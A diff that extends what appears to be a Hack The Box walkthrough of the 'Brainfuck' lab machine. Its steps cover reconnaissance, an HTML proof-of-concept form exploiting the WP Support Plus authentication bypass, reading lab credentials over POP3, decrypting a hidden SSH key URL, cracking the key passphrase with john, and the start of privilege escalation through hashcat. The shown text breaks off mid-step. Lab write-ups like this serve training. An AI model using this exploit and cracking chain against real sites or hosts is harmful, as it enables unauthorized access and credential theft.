@@ -1,4 +1,4 @@
-Reconnaisance
+1. Reconnaisance
 
 nmap -sC -sV -A 10.10.10.17
 
@@ -19,3 +19,77 @@ PORT    STATE SERVICE  VERSION
 |_http-title: Welcome to nginx!
 | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
 | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+
+2. Follow the leads from nmap
+Add the subdomains to /etc/hosts DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+Visit the subdomains over https; The site brainfuck.htb is running wordpress. We proceed to run wpscan over this site.
+
+Gather some usernames from DNS:sup3rs3cr3t.brainfuck.htb : admin and orestis
+wpscan --url https://brainfuck.htb/ --disable-tls-checks
+https://brainfuck.htb/readme.html => The site is running wordpress version 4.7.3
+Plugins : wp-support-plus-responsive-ticket-system ( | Version: 7.1.3 (100% confidence))
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+searchsploit wp support plus
+WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt
+searchsploit -x php/webapps/41006.txt
+
+Proof of Concept
+
+<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
+        Username: <input type="text" name="username" value="admin">
+        <input type="hidden" name="email" value="orestis@brainfuck.htb">
+        <input type="hidden" name="action" value="loginGuestFacebook">
+        <input type="submit" value="Login">
+</form>
+### Load the above proof of concepts
+
+Go to https://brainfuck.htb/wp-admin/options-general.php?page=swpsmtp_settings
+
+Unmask the SMTP password for orestis : kHGuERB29DNiNE
+
+3. Telnet 10.10.10.17 110
+USER orestis PASS kHGuERB29DNiNE
+RETR 1 
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+RETR 2
+Hi there, your credentials for our "secret" forum are below :)
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+4. Crack the keys
+One time pad rumkin
+Encrypted message : Pieagnm - Jkoijeg nbw zwx mle grwsnn
+Pad : Orestis - Hacking for fun and profit
+
+Decrypt Vigenere encryption
+
+Encrypted message : mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
+Key : fuckmybrain
+Decoded message : https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+
+Crack the private key
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Passphrase : 3poulakia!
+chmod 600 id_rsa
+ssh -i id_rsa orestis@10.10.10.17
+Pawned the box as orestis! User file accessed!
+
+5. Privilege Escalation
+#/var/www/cms/wp-config.php
+#define('DB_USER', 'username_here');
+#    'password' => 'hfieINFEIJncIldj'
+    
+#mysql -u 'orestis' -p
+#kHGuERB29DNiNE
+#administrator hash : $P$B0YBeOPbWF2FO7HgARwIAJogW8afZe0
+#orestis hash : $P$BAQpNTfe4/kWGQ9.j6Aia.Hw.VBs580
+ 
+#Hashcat password cracking
+#hashcat -m 400 admin.hash /usr/share/wordlists/rockyou.txt
+
+encryptions keys p, n...
+ 
